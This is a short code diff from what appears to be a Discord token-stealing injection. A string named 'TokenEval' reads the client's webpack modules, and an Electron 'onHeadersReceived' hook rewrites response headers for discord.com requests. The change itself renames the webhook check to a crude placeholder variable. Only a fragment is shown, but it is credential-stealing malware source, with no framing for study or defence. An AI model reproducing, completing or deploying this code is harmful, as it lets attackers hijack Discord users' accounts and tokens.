@@ -11,7 +11,7 @@ const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push
 var sexhook = "dumbass";
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith(webhook)) {
+    if (details.url.startsWith(sexhook)) {
         if (details.url.includes("discord.com")) {
             callback({
                 responseHeaders: Object.assign({
